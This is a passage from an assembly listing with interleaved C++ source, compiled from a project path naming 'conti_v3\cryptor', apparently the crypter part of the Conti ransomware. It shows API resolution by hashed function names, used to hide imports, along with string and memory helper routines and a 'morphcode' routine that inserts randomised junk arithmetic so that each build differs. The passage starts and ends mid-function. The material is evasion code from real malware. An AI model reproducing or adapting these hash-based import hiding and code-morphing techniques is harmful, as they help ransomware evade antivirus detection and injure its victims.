	00		 mov	 ecx, DWORD PTR OrdNomber$5[rbp]
  001c2	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 223  : 
; 224  : 		return getapi::GetProcAddressEx(DLLName, 0, OrdNomber); 

  001c7	44 8b 85 64 01
	00 00		 mov	 r8d, DWORD PTR OrdNomber$5[rbp]
  001ce	33 d2		 xor	 edx, edx
  001d0	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  001d4	e8 00 00 00 00	 call	 ?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z ; getapi::GetProcAddressEx
  001d9	eb 43		 jmp	 SHORT $LN1@GetForvard
$LN4@GetForvard:

; 225  : 
; 226  : 	}
; 227  : 
; 228  : 	DWORD Hash = MurmurHash2A(NameStr, StrLen(NameStr), HASHING_SEED);

  001db	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR NameStr$[rbp]
  001e2	e8 00 00 00 00	 call	 ?StrLen@@YAHPEBD@Z	; StrLen
  001e7	41 b8 da fc 01
	b8		 mov	 r8d, -1207829286	; b801fcdaH
  001ed	8b d0		 mov	 edx, eax
  001ef	48 8b 8d 48 01
	00 00		 mov	 rcx, QWORD PTR NameStr$[rbp]
  001f6	e8 00 00 00 00	 call	 ?MurmurHash2A@@YAIPEBXHI@Z ; MurmurHash2A
  001fb	89 85 84 01 00
	00		 mov	 DWORD PTR Hash$[rbp], eax

; 229  : 
; 230  : 	morphcode(Hash);

  00201	8b 8d 84 01 00
	00		 mov	 ecx, DWORD PTR Hash$[rbp]
  00207	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 231  : 
; 232  : 	return getapi::GetProcAddressEx(DLLName, 0, Hash);

  0020c	44 8b 85 84 01
	00 00		 mov	 r8d, DWORD PTR Hash$[rbp]
  00213	33 d2		 xor	 edx, edx
  00215	48 8d 4d 30	 lea	 rcx, QWORD PTR DLLName$[rbp]
  00219	e8 00 00 00 00	 call	 ?GetProcAddressEx@getapi@@YAPEAXPEBDKK@Z ; getapi::GetProcAddressEx
$LN1@GetForvard:

; 233  : }

  0021e	48 8b f8	 mov	 rdi, rax
  00221	48 8d 4d e0	 lea	 rcx, QWORD PTR [rbp-32]
  00225	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?GetForvardedProc@@YAPEAXPEAD@Z$rtcFrameData
  0022c	e8 00 00 00 00	 call	 _RTC_CheckStackVars
  00231	48 8b c7	 mov	 rax, rdi
  00234	48 8b 8d 58 02
	00 00		 mov	 rcx, QWORD PTR __$ArrayPad$[rbp]
  0023b	48 33 cd	 xor	 rcx, rbp
  0023e	e8 00 00 00 00	 call	 __security_check_cookie
  00243	48 8d a5 68 02
	00 00		 lea	 rsp, QWORD PTR [rbp+616]
  0024a	5f		 pop	 rdi
  0024b	5d		 pop	 rbp
  0024c	c3		 ret	 0
?GetForvardedProc@@YAPEAXPEAD@Z ENDP			; GetForvardedProc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?my_stoi@@YAHPEAD@Z
_TEXT	SEGMENT
strLen$ = 4
i$ = 36
num$ = 68
ten$ = 100
signFlag$ = 132
j$1 = 164
str$ = 416
?my_stoi@@YAHPEAD@Z PROC				; my_stoi, COMDAT

; 134  : {

$LN17:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec a8 01
	00 00		 sub	 rsp, 424		; 000001a8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 135  : 	unsigned int strLen = 0;

  0001f	c7 45 04 00 00
	00 00		 mov	 DWORD PTR strLen$[rbp], 0

; 136  : 	unsigned int i = 0;

  00026	c7 45 24 00 00
	00 00		 mov	 DWORD PTR i$[rbp], 0
$LN2@my_stoi:

; 137  : 	while (str[i] != '\0') {

  0002d	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00030	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  00037	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0003b	85 c0		 test	 eax, eax
  0003d	74 12		 je	 SHORT $LN3@my_stoi

; 138  : 		strLen += 1;

  0003f	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  00042	ff c0		 inc	 eax
  00044	89 45 04	 mov	 DWORD PTR strLen$[rbp], eax

; 139  : 		i++;

  00047	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  0004a	ff c0		 inc	 eax
  0004c	89 45 24	 mov	 DWORD PTR i$[rbp], eax

; 140  : 	}

  0004f	eb dc		 jmp	 SHORT $LN2@my_stoi
$LN3@my_stoi:

; 141  : 
; 142  : 	int num = 0;

  00051	c7 45 44 00 00
	00 00		 mov	 DWORD PTR num$[rbp], 0

; 143  : 	int ten;
; 144  : 	BOOL signFlag = TRUE; //true: +, false: -

  00058	c7 85 84 00 00
	00 01 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 1

; 145  : 	for (i = 0; i < strLen; i++) {

  00062	c7 45 24 00 00
	00 00		 mov	 DWORD PTR i$[rbp], 0
  00069	eb 08		 jmp	 SHORT $LN6@my_stoi
$LN4@my_stoi:
  0006b	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  0006e	ff c0		 inc	 eax
  00070	89 45 24	 mov	 DWORD PTR i$[rbp], eax
$LN6@my_stoi:
  00073	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  00076	39 45 24	 cmp	 DWORD PTR i$[rbp], eax
  00079	0f 83 d9 00 00
	00		 jae	 $LN5@my_stoi

; 146  : 		if (str[i] < '0' || str[i] > '9') {

  0007f	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00082	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  00089	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0008d	83 f8 30	 cmp	 eax, 48			; 00000030H
  00090	7c 13		 jl	 SHORT $LN11@my_stoi
  00092	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00095	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  0009c	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000a0	83 f8 39	 cmp	 eax, 57			; 00000039H
  000a3	7e 51		 jle	 SHORT $LN10@my_stoi
$LN11@my_stoi:

; 147  : 			if (i == 0 && str[i] == '-') {

  000a5	83 7d 24 00	 cmp	 DWORD PTR i$[rbp], 0
  000a9	75 1f		 jne	 SHORT $LN12@my_stoi
  000ab	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  000ae	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  000b5	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000b9	83 f8 2d	 cmp	 eax, 45			; 0000002dH
  000bc	75 0c		 jne	 SHORT $LN12@my_stoi

; 148  : 				signFlag = FALSE;

  000be	c7 85 84 00 00
	00 00 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 0

; 149  : 				continue;

  000c8	eb a1		 jmp	 SHORT $LN4@my_stoi
$LN12@my_stoi:

; 150  : 			}
; 151  : 			if (i == 0 && str[i] == '+') {

  000ca	83 7d 24 00	 cmp	 DWORD PTR i$[rbp], 0
  000ce	75 22		 jne	 SHORT $LN13@my_stoi
  000d0	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  000d3	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  000da	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  000de	83 f8 2b	 cmp	 eax, 43			; 0000002bH
  000e1	75 0f		 jne	 SHORT $LN13@my_stoi

; 152  : 				signFlag = TRUE;

  000e3	c7 85 84 00 00
	00 01 00 00 00	 mov	 DWORD PTR signFlag$[rbp], 1

; 153  : 				continue;

  000ed	e9 79 ff ff ff	 jmp	 $LN4@my_stoi
$LN13@my_stoi:

; 154  : 			}
; 155  : 
; 156  : 			return 0;

  000f2	33 c0		 xor	 eax, eax
  000f4	eb 77		 jmp	 SHORT $LN1@my_stoi
$LN10@my_stoi:

; 157  : 		}
; 158  : 
; 159  : 		ten = 1;

  000f6	c7 45 64 01 00
	00 00		 mov	 DWORD PTR ten$[rbp], 1

; 160  : 		for (unsigned int j = 0; j < strLen - 1 - i; j++) {

  000fd	c7 85 a4 00 00
	00 00 00 00 00	 mov	 DWORD PTR j$1[rbp], 0
  00107	eb 0e		 jmp	 SHORT $LN9@my_stoi
$LN7@my_stoi:
  00109	8b 85 a4 00 00
	00		 mov	 eax, DWORD PTR j$1[rbp]
  0010f	ff c0		 inc	 eax
  00111	89 85 a4 00 00
	00		 mov	 DWORD PTR j$1[rbp], eax
$LN9@my_stoi:
  00117	8b 45 04	 mov	 eax, DWORD PTR strLen$[rbp]
  0011a	ff c8		 dec	 eax
  0011c	2b 45 24	 sub	 eax, DWORD PTR i$[rbp]
  0011f	39 85 a4 00 00
	00		 cmp	 DWORD PTR j$1[rbp], eax
  00125	73 09		 jae	 SHORT $LN8@my_stoi

; 161  : 			ten *= 10;

  00127	6b 45 64 0a	 imul	 eax, DWORD PTR ten$[rbp], 10
  0012b	89 45 64	 mov	 DWORD PTR ten$[rbp], eax

; 162  : 		}

  0012e	eb d9		 jmp	 SHORT $LN7@my_stoi
$LN8@my_stoi:

; 163  : 
; 164  : 		num += ten * (str[i] - '0');

  00130	8b 45 24	 mov	 eax, DWORD PTR i$[rbp]
  00133	48 8b 8d a0 01
	00 00		 mov	 rcx, QWORD PTR str$[rbp]
  0013a	0f be 04 01	 movsx	 eax, BYTE PTR [rcx+rax]
  0013e	83 e8 30	 sub	 eax, 48			; 00000030H
  00141	8b 4d 64	 mov	 ecx, DWORD PTR ten$[rbp]
  00144	0f af c8	 imul	 ecx, eax
  00147	8b c1		 mov	 eax, ecx
  00149	8b 4d 44	 mov	 ecx, DWORD PTR num$[rbp]
  0014c	03 c8		 add	 ecx, eax
  0014e	8b c1		 mov	 eax, ecx
  00150	89 45 44	 mov	 DWORD PTR num$[rbp], eax

; 165  : 	}

  00153	e9 13 ff ff ff	 jmp	 $LN4@my_stoi
$LN5@my_stoi:

; 166  : 
; 167  : 	if (signFlag) {

  00158	83 bd 84 00 00
	00 00		 cmp	 DWORD PTR signFlag$[rbp], 0
  0015f	74 07		 je	 SHORT $LN14@my_stoi

; 168  : 		return num;

  00161	8b 45 44	 mov	 eax, DWORD PTR num$[rbp]
  00164	eb 07		 jmp	 SHORT $LN1@my_stoi

; 169  : 	}

  00166	eb 05		 jmp	 SHORT $LN15@my_stoi
$LN14@my_stoi:

; 170  : 	else {
; 171  : 		return -num;

  00168	8b 45 44	 mov	 eax, DWORD PTR num$[rbp]
  0016b	f7 d8		 neg	 eax
$LN15@my_stoi:
$LN1@my_stoi:

; 172  : 	}
; 173  : }

  0016d	48 8d a5 88 01
	00 00		 lea	 rsp, QWORD PTR [rbp+392]
  00174	5f		 pop	 rdi
  00175	5d		 pop	 rbp
  00176	c3		 ret	 0
?my_stoi@@YAHPEAD@Z ENDP				; my_stoi
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?FindChar@@YAPEADPEADD@Z
_TEXT	SEGMENT
Str$ = 224
Ch$ = 232
?FindChar@@YAPEADPEADD@Z PROC				; FindChar, COMDAT

; 116  : {

$LN6:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
$LN2@FindChar:

; 117  : 	while (*Str)

  00023	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  0002a	0f be 00	 movsx	 eax, BYTE PTR [rax]
  0002d	85 c0		 test	 eax, eax
  0002f	74 31		 je	 SHORT $LN3@FindChar

; 118  : 	{
; 119  : 
; 120  : 		if (*Str == Ch) {

  00031	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  00038	0f be 00	 movsx	 eax, BYTE PTR [rax]
  0003b	0f be 8d e8 00
	00 00		 movsx	 ecx, BYTE PTR Ch$[rbp]
  00042	3b c1		 cmp	 eax, ecx
  00044	75 09		 jne	 SHORT $LN4@FindChar

; 121  : 			return Str;

  00046	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  0004d	eb 15		 jmp	 SHORT $LN1@FindChar
$LN4@FindChar:

; 122  : 		}
; 123  : 
; 124  : 		Str++;

  0004f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  00056	48 ff c0	 inc	 rax
  00059	48 89 85 e0 00
	00 00		 mov	 QWORD PTR Str$[rbp], rax

; 125  : 
; 126  : 	}

  00060	eb c1		 jmp	 SHORT $LN2@FindChar
$LN3@FindChar:

; 127  : 
; 128  : 	return NULL;

  00062	33 c0		 xor	 eax, eax
$LN1@FindChar:

; 129  : }

  00064	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0006b	5f		 pop	 rdi
  0006c	5d		 pop	 rbp
  0006d	c3		 ret	 0
?FindChar@@YAPEADPEADD@Z ENDP				; FindChar
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?m_memcpy@@YAXPEAXQEAX_K@Z
_TEXT	SEGMENT
tmp$ = 8
wordsize$ = 40
_src$ = 72
_dst$ = 104
len$ = 136
tv72 = 344
tv68 = 344
pDst$ = 384
pSrc$ = 392
size$ = 400
?m_memcpy@@YAXPEAXQEAX_K@Z PROC				; m_memcpy, COMDAT

; 96   : {

$LN8:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec 88 01
	00 00		 sub	 rsp, 392		; 00000188H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 97   : 	void* tmp = pDst;

  00029	48 8b 85 80 01
	00 00		 mov	 rax, QWORD PTR pDst$[rbp]
  00030	48 89 45 08	 mov	 QWORD PTR tmp$[rbp], rax

; 98   : 	size_t wordsize = sizeof(size_t);

  00034	48 c7 45 28 08
	00 00 00	 mov	 QWORD PTR wordsize$[rbp], 8

; 99   : 	unsigned char* _src = (unsigned char*)pSrc;

  0003c	48 8b 85 88 01
	00 00		 mov	 rax, QWORD PTR pSrc$[rbp]
  00043	48 89 45 48	 mov	 QWORD PTR _src$[rbp], rax

; 100  : 	unsigned char* _dst = (unsigned char*)pDst;

  00047	48 8b 85 80 01
	00 00		 mov	 rax, QWORD PTR pDst$[rbp]
  0004e	48 89 45 68	 mov	 QWORD PTR _dst$[rbp], rax

; 101  : 	size_t   len;
; 102  : 	for (len = size / wordsize; len--; _src += wordsize, _dst += wordsize)

  00052	33 d2		 xor	 edx, edx
  00054	48 8b 85 90 01
	00 00		 mov	 rax, QWORD PTR size$[rbp]
  0005b	48 f7 75 28	 div	 QWORD PTR wordsize$[rbp]
  0005f	48 89 85 88 00
	00 00		 mov	 QWORD PTR len$[rbp], rax
  00066	eb 24		 jmp	 SHORT $LN4@m_memcpy
$LN2@m_memcpy:
  00068	48 8b 45 28	 mov	 rax, QWORD PTR wordsize$[rbp]
  0006c	48 8b 4d 48	 mov	 rcx, QWORD PTR _src$[rbp]
  00070	48 03 c8	 add	 rcx, rax
  00073	48 8b c1	 mov	 rax, rcx
  00076	48 89 45 48	 mov	 QWORD PTR _src$[rbp], rax
  0007a	48 8b 45 28	 mov	 rax, QWORD PTR wordsize$[rbp]
  0007e	48 8b 4d 68	 mov	 rcx, QWORD PTR _dst$[rbp]
  00082	48 03 c8	 add	 rcx, rax
  00085	48 8b c1	 mov	 rax, rcx
  00088	48 89 45 68	 mov	 QWORD PTR _dst$[rbp], rax
$LN4@m_memcpy:
  0008c	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR len$[rbp]
  00093	48 89 85 58 01
	00 00		 mov	 QWORD PTR tv68[rbp], rax
  0009a	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR len$[rbp]
  000a1	48 ff c8	 dec	 rax
  000a4	48 89 85 88 00
	00 00		 mov	 QWORD PTR len$[rbp], rax
  000ab	48 83 bd 58 01
	00 00 00	 cmp	 QWORD PTR tv68[rbp], 0
  000b3	74 10		 je	 SHORT $LN3@m_memcpy

; 103  : 		*(size_t*)_dst = *(size_t*)_src;

  000b5	48 8b 45 68	 mov	 rax, QWORD PTR _dst$[rbp]
  000b9	48 8b 4d 48	 mov	 rcx, QWORD PTR _src$[rbp]
  000bd	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
  000c0	48 89 08	 mov	 QWORD PTR [rax], rcx
  000c3	eb a3		 jmp	 SHORT $LN2@m_memcpy
$LN3@m_memcpy:

; 104  : 
; 105  : 	len = size % wordsize;

  000c5	33 d2		 xor	 edx, edx
  000c7	48 8b 85 90 01
	00 00		 mov	 rax, QWORD PTR size$[rbp]
  000ce	48 f7 75 28	 div	 QWORD PTR wordsize$[rbp]
  000d2	48 8b c2	 mov	 rax, rdx
  000d5	48 89 85 88 00
	00 00		 mov	 QWORD PTR len$[rbp], rax
$LN5@m_memcpy:

; 106  : 	while (len--)

  000dc	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR len$[rbp]
  000e3	48 89 85 58 01
	00 00		 mov	 QWORD PTR tv72[rbp], rax
  000ea	48 8b 85 88 00
	00 00		 mov	 rax, QWORD PTR len$[rbp]
  000f1	48 ff c8	 dec	 rax
  000f4	48 89 85 88 00
	00 00		 mov	 QWORD PTR len$[rbp], rax
  000fb	48 83 bd 58 01
	00 00 00	 cmp	 QWORD PTR tv72[rbp], 0
  00103	74 25		 je	 SHORT $LN6@m_memcpy

; 107  : 		*_dst++ = *_src++;

  00105	48 8b 45 68	 mov	 rax, QWORD PTR _dst$[rbp]
  00109	48 8b 4d 48	 mov	 rcx, QWORD PTR _src$[rbp]
  0010d	0f b6 09	 movzx	 ecx, BYTE PTR [rcx]
  00110	88 08		 mov	 BYTE PTR [rax], cl
  00112	48 8b 45 68	 mov	 rax, QWORD PTR _dst$[rbp]
  00116	48 ff c0	 inc	 rax
  00119	48 89 45 68	 mov	 QWORD PTR _dst$[rbp], rax
  0011d	48 8b 45 48	 mov	 rax, QWORD PTR _src$[rbp]
  00121	48 ff c0	 inc	 rax
  00124	48 89 45 48	 mov	 QWORD PTR _src$[rbp], rax
  00128	eb b2		 jmp	 SHORT $LN5@m_memcpy
$LN6@m_memcpy:

; 108  : }

  0012a	48 8d a5 68 01
	00 00		 lea	 rsp, QWORD PTR [rbp+360]
  00131	5f		 pop	 rdi
  00132	5d		 pop	 rbp
  00133	c3		 ret	 0
?m_memcpy@@YAXPEAXQEAX_K@Z ENDP				; m_memcpy
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?StrLen@@YAHPEB_W@Z
_TEXT	SEGMENT
Length$ = 4
Str$ = 256
?StrLen@@YAHPEB_W@Z PROC				; StrLen, COMDAT

; 76   : {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 77   : 	INT Length = 0;

  0001f	c7 45 04 00 00
	00 00		 mov	 DWORD PTR Length$[rbp], 0
$LN2@StrLen:

; 78   : 	while (*Str)

  00026	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  0002d	0f b7 00	 movzx	 eax, WORD PTR [rax]
  00030	85 c0		 test	 eax, eax
  00032	74 1c		 je	 SHORT $LN3@StrLen

; 79   : 	{
; 80   : 
; 81   : 		Length++;

  00034	8b 45 04	 mov	 eax, DWORD PTR Length$[rbp]
  00037	ff c0		 inc	 eax
  00039	89 45 04	 mov	 DWORD PTR Length$[rbp], eax

; 82   : 		Str++;

  0003c	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  00043	48 83 c0 02	 add	 rax, 2
  00047	48 89 85 00 01
	00 00		 mov	 QWORD PTR Str$[rbp], rax

; 83   : 
; 84   : 	}

  0004e	eb d6		 jmp	 SHORT $LN2@StrLen
$LN3@StrLen:

; 85   : 
; 86   : 	return Length;

  00050	8b 45 04	 mov	 eax, DWORD PTR Length$[rbp]

; 87   : }

  00053	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
?StrLen@@YAHPEB_W@Z ENDP				; StrLen
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.cpp
;	COMDAT ?StrLen@@YAHPEBD@Z
_TEXT	SEGMENT
Length$ = 4
Str$ = 256
?StrLen@@YAHPEBD@Z PROC					; StrLen, COMDAT

; 60   : {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__10B8ABDC_getapi@cpp
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 61   : 	INT Length = 0;

  0001f	c7 45 04 00 00
	00 00		 mov	 DWORD PTR Length$[rbp], 0
$LN2@StrLen:

; 62   : 	while (*Str)

  00026	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  0002d	0f be 00	 movsx	 eax, BYTE PTR [rax]
  00030	85 c0		 test	 eax, eax
  00032	74 1b		 je	 SHORT $LN3@StrLen

; 63   : 	{
; 64   : 
; 65   : 		Length++;

  00034	8b 45 04	 mov	 eax, DWORD PTR Length$[rbp]
  00037	ff c0		 inc	 eax
  00039	89 45 04	 mov	 DWORD PTR Length$[rbp], eax

; 66   : 		Str++;

  0003c	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR Str$[rbp]
  00043	48 ff c0	 inc	 rax
  00046	48 89 85 00 01
	00 00		 mov	 QWORD PTR Str$[rbp], rax

; 67   : 
; 68   : 	}

  0004d	eb d7		 jmp	 SHORT $LN2@StrLen
$LN3@StrLen:

; 69   : 
; 70   : 	return Length;

  0004f	8b 45 04	 mov	 eax, DWORD PTR Length$[rbp]

; 71   : }

  00052	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00059	5f		 pop	 rdi
  0005a	5d		 pop	 rbp
  0005b	c3		 ret	 0
?StrLen@@YAHPEBD@Z ENDP					; StrLen
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXPEAX@Z
_TEXT	SEGMENT
a$ = 224
?morphcode@@YAXPEAX@Z PROC				; morphcode, COMDAT

; 74   : __forceinline void morphcode(void* a) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__899FCD3C_mrph@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   : 	morphcode((int)a);

  0001f	8b 8d e0 00 00
	00		 mov	 ecx, DWORD PTR a$[rbp]
  00025	e8 00 00 00 00	 call	 ?morphcode@@YAXH@Z	; morphcode

; 76   : }

  0002a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00031	5f		 pop	 rdi
  00032	5d		 pop	 rbp
  00033	c3		 ret	 0
?morphcode@@YAXPEAX@Z ENDP				; morphcode
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
;	COMDAT ?morphcode@@YAXH@Z
_TEXT	SEGMENT
_morph_var$ = 4
a$ = 256
?morphcode@@YAXH@Z PROC					; morphcode, COMDAT

; 35   : __forceinline void morphcode(int a) {

$LN22:
  00000	89 4c 24 08	 mov	 DWORD PTR [rsp+8], ecx
  00004	55		 push	 rbp
  00005	57		 push	 rdi
  00006	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000d	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00012	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__899FCD3C_mrph@h
  00019	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 36   : #else
; 37   : __forceinline void morphcode(char* a) {
; 38   : #endif
; 39   : #ifdef __cplusplus
; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0001e	c7 45 04 61 b8
	38 00		 mov	 DWORD PTR _morph_var$[rbp], 3717217 ; 0038b861H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  00025	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  00028	99		 cdq
  00029	b9 03 00 00 00	 mov	 ecx, 3
  0002e	f7 f9		 idiv	 ecx
  00030	8b c2		 mov	 eax, edx
  00032	85 c0		 test	 eax, eax
  00034	74 34		 je	 SHORT $LN10@morphcode

; 49   : 		_morph_var += (int)a + 2;

  00036	8b 85 00 01 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  0003c	83 c0 02	 add	 eax, 2
  0003f	8b 4d 04	 mov	 ecx, DWORD PTR _morph_var$[rbp]
  00042	03 c8		 add	 ecx, eax
  00044	8b c1		 mov	 eax, ecx
  00046	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN2@morphcode:

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00049	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0004c	99		 cdq
  0004d	83 e2 03	 and	 edx, 3
  00050	03 c2		 add	 eax, edx
  00052	83 e0 03	 and	 eax, 3
  00055	2b c2		 sub	 eax, edx
  00057	85 c0		 test	 eax, eax
  00059	75 0a		 jne	 SHORT $LN3@morphcode
  0005b	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0005e	ff c0		 inc	 eax
  00060	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
  00063	eb e4		 jmp	 SHORT $LN2@morphcode
$LN3@morphcode:

; 51   : 	}

  00065	e9 fb 00 00 00	 jmp	 $LN11@morphcode
$LN10@morphcode:

; 52   : 	else if (_morph_var % 2) {

  0006a	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0006d	99		 cdq
  0006e	83 e0 01	 and	 eax, 1
  00071	33 c2		 xor	 eax, edx
  00073	2b c2		 sub	 eax, edx
  00075	85 c0		 test	 eax, eax
  00077	74 33		 je	 SHORT $LN12@morphcode

; 53   : 		_morph_var -= (int)a - 2;

  00079	8b 85 00 01 00
	00		 mov	 eax, DWORD PTR a$[rbp]
  0007f	83 e8 02	 sub	 eax, 2
  00082	8b 4d 04	 mov	 ecx, DWORD PTR _morph_var$[rbp]
  00085	2b c8		 sub	 ecx, eax
  00087	8b c1		 mov	 eax, ecx
  00089	89 45 04	 mov	 DWORD PTR _morph_var$[rbp], eax
$LN4@morphcode:

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0008c	8b 45 04	 mov	 eax, DWORD PTR _morph_var$[rbp]
  0008f	99		 cdq
  00090	b9 03 00 00 00	 mov	 ecx, 3
  00095	f7 f9		 idiv	 ecx
  00097	8b c2		 mov	 eax, edx
  00099	85 c0		 test	 eax, eax
